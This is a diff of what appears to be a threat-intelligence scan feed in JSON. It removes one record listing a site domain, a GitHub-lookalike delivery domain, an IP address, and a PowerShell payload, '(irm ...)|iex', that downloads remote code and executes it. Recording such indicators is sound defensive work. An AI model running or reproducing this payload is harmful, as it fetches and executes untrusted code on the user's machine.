@@ -11491,24 +11491,5 @@
     ],
     "ReportId": "cmwhmwg110tch0omlhhoi42we",
     "ScannedAt": "2026-11-15T09:30:34.966000+00:00"
-  },
-  {
-    "UrlDomain": "jendelamedia.com",
-    "DeliveryUrl": [
-      "github.pw"
-    ],
-    "PayloadUrl": [
-      "https://github.pw/Girya/b048f5c52ebe0ffe"
-    ],
-    "IP": [
-      "103.244.96.132"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://github[.]pw/Girya/b048f5c52ebe0ffe')|iex",
-    "ResolvedDownloadUrl": [
-      "https://github.pw/Girya/b048f5c52ebe0ffe"
-    ],
-    "ReportId": "cmwhj320f0szd0oml00i8ue6s",
-    "ScannedAt": "2026-11-15T07:43:44.936000+00:00"
   }
 ]
